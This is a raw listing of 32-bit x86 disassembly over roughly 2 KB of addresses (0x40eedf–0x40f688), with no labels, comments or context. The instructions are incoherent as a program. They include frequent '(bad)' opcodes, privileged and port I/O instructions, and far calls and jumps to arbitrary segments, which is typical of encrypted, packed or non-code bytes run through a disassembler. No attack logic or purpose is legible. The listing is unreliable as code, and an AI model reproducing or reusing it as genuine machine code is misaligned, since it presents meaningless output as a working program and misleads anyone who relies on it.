  40eedf:	cmp    BYTE PTR [bx+si+0x6dd9],dh
  40eee4:	sti    
  40eee5:	jbe    0x40eeb4
  40eee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eee8:	xor    eax,0xaa6188c3
  40eeed:	jae    0x40ef21
  40eeef:	shl    DWORD PTR [edx-0x2d29c768],0xbd
  40eef6:	neg    BYTE PTR [esi+esi*1]
  40eef9:	or     esi,edx
  40eefb:	cmp    eax,0x5a621c62
  40ef00:	into   
  40ef01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef02:	popf   
  40ef03:	fbld   TBYTE PTR [eax+0x34]
  40ef06:	sbb    DWORD PTR [ebx],ebx
  40ef08:	xchg   edx,eax
  40ef09:	adc    BYTE PTR [ecx-0x79f45483],ch
  40ef0f:	mov    ebp,0xa062d0cd
  40ef14:	mov    DWORD PTR [eax-0x66],esp
  40ef17:	mov    bh,BYTE PTR [ebx-0x6e]
  40ef1a:	int3   
  40ef1b:	mov    edx,0xbb2b06b9
  40ef20:	out    0xad,eax
  40ef22:	jmp    0x2989dbce
  40ef27:	push   ds
  40ef28:	adc    eax,0x67278ce0
  40ef2d:	iret   
  40ef2e:	call   0x2eb9:0x12aa68d8
  40ef35:	or     ebx,DWORD PTR [ecx-0x708fb064]
  40ef3b:	dec    esi
  40ef3c:	dec    BYTE PTR [edx+ebx*4+0x4a5ada2]
  40ef43:	nop
  40ef44:	mov    eax,ds:0x12a74ede
  40ef49:	clc    
  40ef4a:	inc    esp
  40ef4b:	int3   
  40ef4c:	sub    DWORD PTR [ebx+eiz*4],esp
  40ef4f:	and    eax,0x8677d2b3
  40ef54:	enter  0x3ffb,0x90
  40ef58:	xchg   edx,eax
  40ef59:	iret   
  40ef5a:	clc    
  40ef5b:	mov    ds:0xfd6fbe32,al
  40ef60:	xchg   edx,eax
  40ef61:	iret   
  40ef62:	mov    BYTE PTR [edi-0x38],ah
  40ef65:	jno    0x40ef4d
  40ef67:	jmp    0xd766:0xa7c44dfa
  40ef6e:	mov    ebp,DWORD PTR [ebx+0x37]
  40ef71:	mov    WORD PTR [edx+eiz*4+0x30b9b5d7],?
  40ef78:	stc    
  40ef79:	mov    edx,DWORD PTR [eax-0x1]
  40ef7c:	sub    DWORD PTR [edi],0xffffff9a
  40ef7f:	and    esi,DWORD PTR [ebx-0xc]
  40ef82:	test   eax,0xad577006
  40ef87:	(bad)  
  40ef88:	lods   al,BYTE PTR ds:[esi]
  40ef89:	xor    esi,DWORD PTR [ecx+eiz*8+0xa44f535]
  40ef90:	dec    ebx
  40ef91:	or     edx,esp
  40ef93:	loopne 0x40ef45
  40ef95:	xor    ah,dl
  40ef97:	pusha  
  40ef98:	mov    dl,0xa8
  40ef9a:	scas   al,BYTE PTR es:[edi]
  40ef9b:	push   ss
  40ef9c:	cli    
  40ef9d:	dec    eax
  40ef9e:	jmp    0x615d9244
  40efa3:	mov    dl,ch
  40efa5:	or     bh,BYTE PTR [esi-0x4d60f8eb]
  40efab:	xchg   edi,eax
  40efac:	jge    0x40efea
  40efae:	call   0x7055:0x2a5d3276
  40efb5:	je     0x40efc2
  40efb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb8:	adc    al,0x7f
  40efba:	adc    bh,bl
  40efbc:	mov    bh,0x8
  40efbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efbf:	push   ebp
  40efc0:	pushf  
  40efc1:	or     ebp,DWORD PTR [eax]
  40efc3:	push   0x78
  40efc5:	add    BYTE PTR [esi-0x55f4d984],dh
  40efcb:	jmp    0x40f01a
  40efcd:	sbb    eax,0xfa7c3d2f
  40efd2:	call   0x740b:0xf21f5c86
  40efd9:	mov    al,ds:0xc000a0fd
  40efde:	xor    BYTE PTR [esi-0x2f],0x6b
  40efe2:	push   esp
  40efe3:	lahf   
  40efe4:	rcl    DWORD PTR [ecx],cl
  40efe6:	call   0x657e:0x8d9af3bc
  40efed:	jns    0x40ef9b
  40efef:	inc    ebx
  40eff0:	cmc    
  40eff1:	or     ebp,DWORD PTR ds:0x496d90c0
  40eff7:	cdq    
  40eff8:	stc    
  40eff9:	add    al,0x9a
  40effb:	push   ecx
  40effc:	push   0x9193988f
  40f001:	adc    al,al
  40f003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f004:	mov    cl,0x32
  40f006:	int    0xb5
  40f008:	cmp    esp,esp
  40f00a:	pop    edi
  40f00b:	xlat   BYTE PTR ds:[ebx]
  40f00c:	mov    dl,0x52
  40f00e:	xchg   esp,eax
  40f00f:	push   0xffffffbf
  40f011:	jo     0x40f074
  40f013:	ror    BYTE PTR [ebx+ebx*4+0x57],0xb5
  40f018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f019:	adc    DWORD PTR [bx-0x4092],esp
  40f01e:	dec    ecx
  40f01f:	data16 adc ah,BYTE PTR [eax-0x66]
  40f023:	dec    esp
  40f024:	stos   DWORD PTR es:[edi],eax
  40f025:	mov    ecx,0x6bd7e2a2
  40f02a:	cwde   
  40f02b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f02c:	mov    ebp,0x7d6b7d86
  40f031:	rol    DWORD PTR [edi+0x78],0xb2
  40f035:	jge    0x40f01b
  40f037:	mov    eax,ds:0x1a6b7635
  40f03c:	bound  ecx,QWORD PTR [ebx]
  40f03e:	dec    BYTE PTR [edx+0x7a]
  40f041:	shr    BYTE PTR [esi+0x3f],cl
  40f044:	js     0x40f0bf
  40f046:	popf   
  40f047:	and    DWORD PTR [edi+0x62faaaf2],0x8de9ef1f
  40f051:	or     ebp,DWORD PTR [ebx+0x5f]
  40f054:	or     DWORD PTR [eax],edx
  40f056:	cmc    
  40f057:	stos   DWORD PTR es:[edi],eax
  40f058:	mov    al,0x65
  40f05a:	call   0x6088:0x86a6f541
  40f061:	push   0xa
  40f063:	mov    al,ds:0xf552c20e
  40f068:	push   ds
  40f069:	imul   edi,esp,0x50
  40f06c:	jmp    0xbcff:0x97a9a5e
  40f073:	lea    esi,[ebx-0x30587002]
  40f079:	mov    al,ds:0xf6f4f975
  40f07e:	pop    es
  40f07f:	push   DWORD PTR [edx+0x2ceb092f]
  40f085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f087:	into   
  40f088:	inc    edx
  40f089:	or     esi,DWORD PTR [ebx]
  40f08b:	mov    edx,0x27295249
  40f090:	mov    ds:0x4e359a49,eax
  40f095:	sbb    al,bh
  40f097:	mov    dl,0xed
  40f099:	push   cs
  40f09a:	fwait
  40f09b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f09c:	pop    eax
  40f09d:	push   es
  40f09e:	test   edi,esi
  40f0a0:	jae    0x40f044
  40f0a2:	fld    DWORD PTR [edi+0x13]
  40f0a5:	mov    bl,0x99
  40f0a7:	jp     0x40f06b
  40f0a9:	das    
  40f0aa:	loop   0x40f102
  40f0ac:	or     BYTE PTR [ebx],cl
  40f0ae:	push   ds
  40f0af:	xor    eax,DWORD PTR [edi]
  40f0b1:	dec    edi
  40f0b2:	push   0x9a3ee1b0
  40f0b7:	ret    
  40f0b8:	dec    ebx
  40f0b9:	push   ss
  40f0ba:	test   al,0xa5
  40f0bc:	(bad)  
  40f0bd:	cli    
  40f0be:	pop    ebx
  40f0bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0c0:	mov    eax,edx
  40f0c2:	aad    0x36
  40f0c4:	pop    eax
  40f0c5:	pop    ecx
  40f0c6:	ja     0x40f054
  40f0c8:	mov    dl,0xa7
  40f0ca:	cmp    BYTE PTR [edx],al
  40f0cc:	and    eax,0x8485353e
  40f0d1:	or     edx,ebx
  40f0d3:	sub    al,BYTE PTR [ebx-0xda7bd25]
  40f0d9:	mov    ds:0xb9b74de9,al
  40f0de:	xor    BYTE PTR [edi-0x73e5a5d9],0xf6
  40f0e5:	mov    esp,0x62c3a722
  40f0ea:	mov    al,0xad
  40f0ec:	push   ecx
  40f0ed:	xchg   ebp,eax
  40f0ee:	popa   
  40f0ef:	mov    esp,0x889b18c5
  40f0f4:	es jnp 0x40f0f5
  40f0f7:	scas   eax,DWORD PTR es:[edi]
  40f0f8:	mov    bl,0x87
  40f0fa:	jmp    0x3f01:0x4f0bde44
  40f101:	ret    0x5c77
  40f104:	add    BYTE PTR ds:0x8d31ef9a,dh
  40f10a:	add    BYTE PTR [eax-0x7ffe24b8],ah
  40f110:	shr    ecx,cl
  40f112:	jp     0x40f143
  40f114:	jne    0x40f150
  40f116:	call   0xdaab:0xf73163e0
  40f11d:	jbe    0x40f183
  40f11f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f120:	fwait
  40f121:	jmp    0x40f0fd
  40f123:	jmp    0xcb817398
  40f128:	mov    dl,0x65
  40f12a:	pusha  
  40f12b:	dec    edx
  40f12c:	mov    BYTE PTR [esi+0xb],al
  40f12f:	mov    esi,0xf3730b96
  40f134:	in     eax,dx
  40f135:	mov    eax,0x8706ccb8
  40f13a:	cli    
  40f13b:	and    eax,0x67d6eae4
  40f140:	aam    0xe1
  40f142:	adc    ah,BYTE PTR [esi+0x5fc671a7]
  40f148:	cmc    
  40f149:	or     al,0xb6
  40f14b:	outs   dx,DWORD PTR ds:[esi]
  40f14c:	add    dh,BYTE PTR [ebp-0x7b]
  40f14f:	or     DWORD PTR [edx],ebx
  40f151:	dec    ecx
  40f152:	call   0xa5ad:0xa36a2afa
  40f159:	or     edi,esp
  40f15b:	dec    eax
  40f15c:	cmp    bl,BYTE PTR [ebx+0x12d8c213]
  40f162:	xchg   ecx,eax
  40f163:	cmp    dh,BYTE PTR [eax-0x2826fc24]
  40f169:	or     ecx,DWORD PTR [edx-0x57]
  40f16c:	inc    eax
  40f16d:	adc    al,0x56
  40f16f:	sub    BYTE PTR [edx],0xf0
  40f172:	cdq    
  40f173:	arpl   WORD PTR [edx-0x575ecc7d],di
  40f179:	jmp    0x40f198
  40f17b:	test   dl,0xc
  40f17e:	add    DWORD PTR [ecx-0x62],esi
  40f181:	fldcw  WORD PTR [esi-0x4d]
  40f184:	mov    al,ds:0x24893d8b
  40f189:	and    cl,BYTE PTR [ebp+0x208d6a8c]
  40f18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f190:	mov    edi,0xffb690c4
  40f195:	dec    esp
  40f196:	call   0x8d6d:0xe30a10b0
  40f19d:	addr16 in eax,0xa7
  40f1a0:	arpl   WORD PTR [esi+0x7bfbc1ce],si
  40f1a6:	pop    edx
  40f1a7:	int3   
  40f1a8:	add    bh,BYTE PTR [edx]
  40f1aa:	call   0x6218:0x12107492
  40f1b1:	push   cs
  40f1b2:	and    al,0xa7
  40f1b4:	rcl    DWORD PTR [ebx-0x23597777],cl
  40f1ba:	stos   BYTE PTR es:[edi],al
  40f1bb:	mov    ch,0xb5
  40f1bd:	(bad)  
  40f1be:	ror    BYTE PTR [esi+0x9],cl
  40f1c1:	retf   
  40f1c2:	or     bl,BYTE PTR [eax]
  40f1c4:	push   ss
  40f1c5:	xor    BYTE PTR [ecx+edi*4-0x5d],0x4c
  40f1ca:	and    esi,0x7341684c
  40f1d0:	sub    cl,bl
  40f1d2:	imul   edx,DWORD PTR [edx-0x4e],0xfffffffd
  40f1d6:	jno    0x40f1dd
  40f1d8:	adc    al,0x31
  40f1da:	ins    DWORD PTR es:[edi],dx
  40f1db:	xchg   edi,eax
  40f1dc:	inc    edx
  40f1dd:	or     ebx,DWORD PTR [esi-0x6]
  40f1e0:	push   ds
  40f1e1:	pushf  
  40f1e2:	idiv   BYTE PTR [edx]
  40f1e4:	enter  0x9ad1,0x88
  40f1e8:	sub    al,BYTE PTR [edx]
  40f1ea:	jb     0x40f1eb
  40f1ec:	pop    ecx
  40f1ed:	jbe    0x40f1a5
  40f1ef:	sbb    DWORD PTR [esp+esi*1],0xc6dfa475
  40f1f6:	push   0x6a57192a
  40f1fb:	add    BYTE PTR [eax],dl
  40f1fd:	out    0x9a,al
  40f1ff:	rcr    BYTE PTR [esi+ecx*1+0x6b],0x33
  40f204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f205:	out    dx,eax
  40f206:	xchg   ebx,eax
  40f207:	lods   al,BYTE PTR ds:[esi]
  40f208:	rol    bl,0x96
  40f20b:	icebp  
  40f20c:	xor    ch,BYTE PTR [edi+0x6cf81789]
  40f212:	fwait
  40f213:	je     0x40f25d
  40f215:	and    esp,edi
  40f217:	fwait
  40f218:	std    
  40f219:	in     eax,0xba
  40f21b:	mov    ecx,DWORD PTR [ecx-0x34f276d]
  40f221:	(bad)  
  40f223:	sbb    eax,0xe78bccbd
  40f228:	push   ds
  40f229:	jge    0x40f1fc
  40f22b:	push   edx
  40f22c:	push   ecx
  40f22d:	or     edi,DWORD PTR [edx+edx*8+0xc]
  40f231:	add    ecx,DWORD PTR [eax]
  40f233:	xchg   edx,eax
  40f234:	jp     0x40f214
  40f236:	test   esi,ecx
  40f238:	xor    eax,DWORD PTR [ecx]
  40f23a:	(bad)  
  40f23c:	jnp    0x40f23b
  40f23e:	mov    dh,0x1
  40f240:	push   0x7d
  40f242:	adc    esp,DWORD PTR [esi+eax*4-0x6bfb0f57]
  40f249:	sub    edx,DWORD PTR [edx]
  40f24b:	xchg   BYTE PTR [esi+0x5b],bl
  40f24e:	shl    BYTE PTR [ecx],cl
  40f250:	add    DWORD PTR [ecx],ecx
  40f252:	sbb    cl,ah
  40f254:	xor    eax,0x1277dae
  40f259:	jmp    0x97215bf
  40f25e:	push   0xb63e1551
  40f263:	dec    ebp
  40f264:	jb     0x40f233
  40f266:	mov    bh,0x46
  40f268:	pop    ebx
  40f269:	(bad)  
  40f26a:	fdivr  QWORD PTR [ebx-0x5dcbad4e]
  40f270:	pop    DWORD PTR [esp+edx*1]
  40f273:	push   ebx
  40f274:	push   eax
  40f275:	or     ebp,edx
  40f277:	idiv   BYTE PTR [ebx]
  40f279:	iret   
  40f27a:	lods   eax,DWORD PTR ds:[esi]
  40f27b:	das    
  40f27c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f27d:	sub    dl,BYTE PTR [edi+edi*1-0x58535abf]
  40f284:	rcr    BYTE PTR [esi+0x7875fa31],cl
  40f28a:	add    ecx,DWORD PTR [ecx+eax*2-0x5e]
  40f28e:	sti    
  40f28f:	mov    al,dl
  40f291:	dec    esp
  40f292:	xchg   bh,bh
  40f294:	and    eax,eax
  40f296:	call   0xb437:0xabc06574
  40f29d:	out    dx,eax
  40f29e:	call   0x8b42:0x3524c39f
  40f2a5:	mov    ds:0xc24a7b9,al
  40f2aa:	xchg   ecx,eax
  40f2ab:	sbb    al,0x54
  40f2ad:	in     al,dx
  40f2ae:	and    BYTE PTR ds:0xf35079b2,ah
  40f2b4:	inc    ebp
  40f2b5:	ins    BYTE PTR es:[edi],dx
  40f2b6:	retf   0x632
  40f2b9:	add    al,0x12
  40f2bb:	push   ebp
  40f2bd:	xor    DWORD PTR [edx],ebx
  40f2bf:	add    al,0xfd
  40f2c1:	inc    edx
  40f2c2:	(bad)  
  40f2c3:	mov    bh,0xb6
  40f2c5:	cs inc esp
  40f2c7:	pop    ecx
  40f2c8:	mov    cl,0x64
  40f2ca:	sbb    dh,BYTE PTR [edx-0x46]
  40f2cd:	mov    edi,0x22f0a767
  40f2d2:	xchg   esp,eax
  40f2d3:	mov    cl,0xb9
  40f2d5:	leave  
  40f2d6:	out    0x19,eax
  40f2d8:	mov    dl,0xe3
  40f2da:	or     esp,DWORD PTR [eax-0x9]
  40f2dd:	inc    ebp
  40f2de:	imul   esi,DWORD PTR [eax+eax*1+0xb],0x10b3f279
  40f2e6:	in     al,0x4e
  40f2e8:	jg     0x40f318
  40f2ea:	xchg   esp,eax
  40f2eb:	(bad)  
  40f2ec:	inc    eax
  40f2ed:	mov    cl,0xc0
  40f2ef:	inc    edi
  40f2f0:	inc    ecx
  40f2f1:	cmp    BYTE PTR [edx-0x69],cl
  40f2f4:	rcl    BYTE PTR [ebx+0x1deea41b],1
  40f2fa:	call   DWORD PTR [edx+0x6d5ac3e2]
  40f300:	or     BYTE PTR [eax],bl
  40f302:	call   0x44c6:0x2b7bd807
  40f309:	mov    esi,0x3a22a75b
  40f30e:	sbb    dl,bl
  40f310:	push   0xb29c5cf9
  40f315:	daa    
  40f316:	pop    ds
  40f317:	aam    0xd5
  40f319:	outs   dx,BYTE PTR ds:[esi]
  40f31a:	in     eax,dx
  40f31b:	stos   DWORD PTR es:[edi],eax
  40f31c:	mov    dh,0xb
  40f31e:	mov    cl,0xd2
  40f320:	mov    ds:0xa056ad3f,eax
  40f325:	mov    bh,0x99
  40f327:	ds in  eax,0x5d
  40f32a:	xor    bl,dl
  40f32c:	ja     0x40f2e1
  40f32e:	sub    BYTE PTR [eax+ecx*2-0x2a8597f5],0x96
  40f336:	rol    edi,cl
  40f338:	sbb    al,0xcc
  40f33a:	xchg   DWORD PTR [ebp-0xce59020],ebp
  40f340:	nop
  40f341:	fs mov esi,0xb0b7f02
  40f347:	cmp    edi,esp
  40f349:	mov    bh,0xb9
  40f34b:	pop    esi
  40f34c:	add    bl,BYTE PTR [edx+ebx*4+0x2c]
  40f350:	stc    
  40f351:	imul   BYTE PTR [esi+0x3c]
  40f354:	mov    esi,0x24a4a451
  40f359:	sbb    dl,BYTE PTR [eax+0x52]
  40f35c:	and    edx,DWORD PTR [ebp+0x1133a652]
  40f362:	call   0x14ea:0x21d38b46
  40f369:	jecxz  0x40f357
  40f36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f36c:	add    DWORD PTR [esi],ecx
  40f36e:	(bad)  
  40f36f:	out    dx,eax
  40f370:	and    al,0x6d
  40f372:	mov    ebp,0xd6d78fa4
  40f377:	test   al,0x37
  40f379:	loopne 0x40f3d2
  40f37b:	(bad)  
  40f37c:	scas   al,BYTE PTR es:[di]
  40f37e:	xchg   ebp,eax
  40f37f:	pop    ds
  40f380:	repnz or eax,DWORD PTR [ebx-0x5f0d571]
  40f387:	sub    BYTE PTR [edi-0x5f],bl
  40f38a:	cwde   
  40f38b:	dec    ebp
  40f38c:	repz clc 
  40f38e:	(bad)  
  40f38f:	pushf  
  40f390:	inc    edx
  40f391:	dec    ebx
  40f392:	pop    ss
  40f393:	inc    ecx
  40f394:	out    0xa,eax
  40f396:	pop    esi
  40f397:	mov    al,0x85
  40f399:	inc    eax
  40f39a:	and    ah,BYTE PTR [eax+0x2]
  40f39d:	(bad)  
  40f39e:	jmp    0x9a173dac
  40f3a3:	rcl    DWORD PTR [eax+0x515a295],cl
  40f3a9:	fwait
  40f3aa:	(bad)  
  40f3ab:	mov    edx,0xa6510b7b
  40f3b0:	xchg   edx,eax
  40f3b1:	inc    ebp
  40f3b2:	adc    BYTE PTR [esi-0x765baf80],bl
  40f3b8:	mov    al,0xb
  40f3ba:	jno    0x40f38c
  40f3bc:	mov    edx,0xdcf34d4c
  40f3c1:	or     esp,DWORD PTR [esi-0x35]
  40f3c4:	jp     0x40f379
  40f3c6:	repz xor DWORD PTR [edi-0x51],esi
  40f3ca:	fwait
  40f3cb:	adc    BYTE PTR [ebx+0x4],bh
  40f3ce:	jl     0x40f35d
  40f3d0:	pop    ecx
  40f3d1:	call   DWORD PTR [esi+0x3b]
  40f3d4:	jo     0x40f3e1
  40f3d6:	cdq    
  40f3d7:	mov    ds:0xc73284fa,al
  40f3dc:	inc    edx
  40f3dd:	test   DWORD PTR [edx+0x75f2d12],ebx
  40f3e3:	mov    ah,0x1e
  40f3e5:	cmp    BYTE PTR [esp+eiz*4+0x10],bh
  40f3e9:	push   ebp
  40f3ea:	jno    0x40f43e
  40f3ec:	cdq    
  40f3ed:	cwde   
  40f3ee:	xor    ch,BYTE PTR [ecx+eiz*8+0x6b959aa4]
  40f3f5:	inc    esp
  40f3f6:	inc    edi
  40f3f7:	daa    
  40f3f8:	outs   dx,BYTE PTR ds:[esi]
  40f3f9:	sbb    al,0xeb
  40f3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3fc:	mov    eax,ds:0xeb53d6f8
  40f401:	ja     0x40f470
  40f403:	xchg   DWORD PTR [edx+0x7678d82f],esi
  40f409:	and    WORD PTR [edx],si
  40f40c:	out    dx,al
  40f40d:	jnp    0x40f401
  40f40f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f410:	or     eax,0x95487aa3
  40f415:	jno    0x40f3c0
  40f417:	ins    DWORD PTR es:[edi],dx
  40f418:	pop    esp
  40f419:	inc    eax
  40f41a:	xchg   DWORD PTR [eax-0x2a5af3b],edx
  40f420:	loop   0x40f3eb
  40f422:	xor    BYTE PTR [esp+edx*2],bh
  40f425:	or     ecx,DWORD PTR [eax-0x11]
  40f428:	or     bl,bl
  40f42a:	dec    esp
  40f42b:	pusha  
  40f42c:	xor    ch,ah
  40f42e:	cwde   
  40f42f:	mov    esp,DWORD PTR [edi]
  40f431:	cmp    BYTE PTR [edx],cl
  40f433:	lea    edi,[esi]
  40f435:	mov    ebx,DWORD PTR ds:0x77c9e33f
  40f43b:	sti    
  40f43c:	icebp  
  40f43d:	rcr    DWORD PTR [edx-0x79a00f7b],1
  40f443:	addr16 sti 
  40f445:	push   eax
  40f446:	call   0x18a3:0xf1239f44
  40f44d:	add    al,0xe0
  40f44f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f450:	sbb    esi,edi
  40f452:	call   0x90bd05a
  40f457:	int    0xb2
  40f459:	test   eax,0xa6bbb4a5
  40f45e:	sbb    eax,0xcb084354
  40f463:	enter  0xb755,0x81
  40f467:	cmp    al,0x22
  40f469:	adc    cl,BYTE PTR [ecx+0x5f]
  40f46c:	mov    dl,0xaf
  40f46e:	cmp    BYTE PTR [ebp+0x7db9e2e0],ah
  40f474:	clc    
  40f475:	add    BYTE PTR [ebx-0x29],bl
  40f478:	or     DWORD PTR [edi-0x22dcf2e4],ebx
  40f47e:	call   0x1731:0xa2965fd2
  40f485:	sub    DWORD PTR [ebx+0x4e53eed4],esp
  40f48b:	repnz pop ecx
  40f48e:	call   0xdc4f:0xe7044c42
  40f495:	jge    0x40f431
  40f497:	sbb    DWORD PTR [ecx-0x7bfaaa15],esi
  40f49d:	fwait
  40f49e:	cs push esi
  40f4a0:	ret    0xd1f0
  40f4a3:	mov    eax,0x275d057e
  40f4a8:	(bad)  
  40f4a9:	shl    DWORD PTR [esi+edi*1+0x1c],1
  40f4ad:	int    0xeb
  40f4af:	cwde   
  40f4b0:	mov    dl,0xeb
  40f4b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4b3:	jecxz  0x40f4b2
  40f4b5:	cwde   
  40f4b6:	std    
  40f4b7:	es inc esp
  40f4b9:	je     0x40f444
  40f4bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4bc:	cmp    dl,BYTE PTR [ebp+0x202873b6]
  40f4c2:	pop    eax
  40f4c3:	aaa    
  40f4c4:	scas   eax,DWORD PTR es:[edi]
  40f4c5:	enter  0x3b42,0x72
  40f4c9:	loop   0x40f529
  40f4cb:	cmc    
  40f4cc:	inc    esp
  40f4cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4d0:	add    al,0x73
  40f4d2:	mov    edx,ebx
  40f4d4:	push   DWORD PTR [eax-0x44d8565]
  40f4da:	sbb    al,BYTE PTR [ebx]
  40f4dc:	mov    dh,0x77
  40f4de:	cmp    cl,BYTE PTR [esi+ecx*4+0x66cbe40e]
  40f4e5:	lea    edx,[ebp-0x76a583a0]
  40f4eb:	sub    ch,BYTE PTR [edi-0x1d]
  40f4ee:	sub    eax,0x7cb34eff
  40f4f3:	les    esi,FWORD PTR [edx+0x4d32f4e0]
  40f4f9:	idiv   BYTE PTR [edi+0x5a0b4127]
  40f4ff:	inc    ecx
  40f500:	(bad)  
  40f501:	in     al,dx
  40f502:	or     BYTE PTR [ebp-0x53656d91],al
  40f508:	sar    DWORD PTR [ebx+0x2b3bd849],cl
  40f50e:	into   
  40f50f:	inc    ebp
  40f510:	mov    cl,0x34
  40f512:	and    edx,DWORD PTR [esi]
  40f514:	xor    ah,BYTE PTR [edi+0x3b]
  40f517:	imul   ecx,ecx,0xffffffff
  40f51a:	jnp    0x40f51d
  40f51c:	mov    bl,0x18
  40f51e:	lds    esi,FWORD PTR [ecx-0x1f]
  40f521:	sti    
  40f522:	cmp    eax,0xbe4b5883
  40f527:	or     BYTE PTR [eax+0xb],al
  40f52a:	ret    
  40f52b:	repz ret 
  40f52d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f52e:	imul   edi,DWORD PTR [ebx+edx*4+0x37],0xffffffeb
  40f533:	sahf   
  40f534:	mov    eax,ds:0xb2344483
  40f539:	jp     0x40f51f
  40f53b:	dec    ebp
  40f53c:	fnstsw WORD PTR [esi+0x74a2a7df]
  40f542:	adc    BYTE PTR [edx+0x647180f5],dl
  40f548:	lods   al,BYTE PTR ds:[esi]
  40f549:	or     DWORD PTR [edx],ebp
  40f54b:	push   ss
  40f54c:	mov    dl,0xfe
  40f54e:	imul   eax,edx,0xa70fa0fc
  40f554:	sub    al,BYTE PTR [esi+0x4b]
  40f557:	dec    ebx
  40f558:	sub    DWORD PTR [ecx-0x5543f1c3],esi
  40f55e:	into   
  40f55f:	enter  0x17cd,0x1d
  40f563:	cmp    esi,ebp
  40f565:	mov    ebx,0x1e76267b
  40f56a:	push   esi
  40f56b:	jmp    FWORD PTR [ebx+0x1e7fff0b]
  40f571:	imul   ecx,DWORD PTR ds:0x62312346,0xf628b123
  40f57b:	dec    esi
  40f57c:	aas    
  40f57d:	lahf   
  40f57e:	mov    ch,0x17
  40f580:	inc    edi
  40f581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f582:	mov    esp,0x16b522b9
  40f587:	in     al,0xc9
  40f589:	and    DWORD PTR [eax+0x78],edx
  40f58c:	add    bl,ch
  40f58e:	dec    ebx
  40f58f:	lock mov dl,0xd8
  40f592:	pop    edi
  40f593:	shr    BYTE PTR [ecx-0x43e68aac],1
  40f599:	add    eax,0xaf03d2bc
  40f59e:	pop    edx
  40f59f:	stos   DWORD PTR es:[edi],eax
  40f5a0:	jb     0x40f595
  40f5a2:	jmp    0x40f609
  40f5a4:	mov    dl,0x40
  40f5a6:	inc    edi
  40f5a7:	pop    edx
  40f5a8:	sub    DWORD PTR [edi+ecx*8-0x80],eax
  40f5ac:	ror    DWORD PTR [edx],1
  40f5ae:	inc    esp
  40f5af:	fcomip st,st(0)
  40f5b1:	push   0x52
  40f5b3:	xchg   ecx,eax
  40f5b4:	clc    
  40f5b5:	out    0x57,eax
  40f5b7:	ret    
  40f5b8:	or     ch,BYTE PTR [ebx-0x66]
  40f5bb:	mov    ecx,0x88de8ea8
  40f5c0:	mov    bh,0x78
  40f5c2:	pop    esi
  40f5c3:	mov    edx,0x67ec661e
  40f5c8:	das    
  40f5c9:	out    0x98,eax
  40f5cb:	xchg   edi,eax
  40f5cc:	jle    0x40f5ee
  40f5ce:	call   0xf035:0x61f30548
  40f5d5:	and    DWORD PTR [ebp+0x4beaaaa7],edx
  40f5db:	inc    ebp
  40f5dc:	leave  
  40f5dd:	ja     0x40f589
  40f5df:	jp     0x40f593
  40f5e1:	mov    ds:0x184ae277,al
  40f5e6:	adc    ecx,edi
  40f5e8:	inc    edi
  40f5e9:	add    al,0x8d
  40f5eb:	lock push ecx
  40f5ed:	xor    eax,0x65273b5
  40f5f2:	addr16 cmp ecx,esi
  40f5f5:	sbb    bl,BYTE PTR [ebp+0x1e0cbc3]
  40f5fb:	jg     0x40f61f
  40f5fd:	jg     0x40f65b
  40f5ff:	cmp    BYTE PTR [esi],cl
  40f601:	or     BYTE PTR [eax-0x2211b1e9],dl
  40f607:	into   
  40f608:	push   0xffffffea
  40f60a:	xlat   BYTE PTR ds:[ebx]
  40f60b:	xchg   edx,eax
  40f60c:	mov    dl,0x68
  40f60e:	sbb    bh,BYTE PTR [ebx+0x604480c]
  40f614:	mov    DWORD PTR [eax],esi
  40f616:	imul   esi,DWORD PTR [ecx-0x62f3d8ce],0x38
  40f61d:	aam    0xe4
  40f61f:	test   eax,0xd8d64eb2
  40f624:	loope  0x40f61e
  40f626:	or     eax,0x9f0b103e
  40f62b:	mov    ecx,0xcdc584fd
  40f630:	jmp    DWORD PTR [edx+ebx*4-0x2a]
  40f634:	mov    edi,0x623119e2
  40f639:	iret   
  40f63a:	arpl   WORD PTR [edi-0x431c6c21],sp
  40f640:	or     eax,0xb373c4e5
  40f645:	cmp    edi,DWORD PTR [edi-0x7d2ef1a9]
  40f64b:	jno    0x40f69f
  40f64d:	bound  esi,QWORD PTR [edx+0x6754b5a7]
  40f653:	repnz add al,0x1b
  40f656:	mov    eax,ds:0xed6ab2c7
  40f65b:	int    0x3f
  40f65d:	push   eax
  40f65e:	cdq    
  40f65f:	adc    ecx,DWORD PTR ds:0xad1f1c0b
  40f665:	add    eax,0x51b71e2d
  40f66a:	xchg   WORD PTR [edx+0x303b7f0c],si
  40f671:	dec    ebx
  40f672:	sti    
  40f673:	push   ss
  40f674:	test   eax,0xa2835693
  40f679:	out    0xb9,al
  40f67b:	(bad)  
  40f67c:	sbb    al,0xb
  40f67e:	and    esp,esi
  40f680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f681:	inc    ebp
  40f682:	adc    ah,BYTE PTR [ebp-0xe64683d]
  40f688:	nop
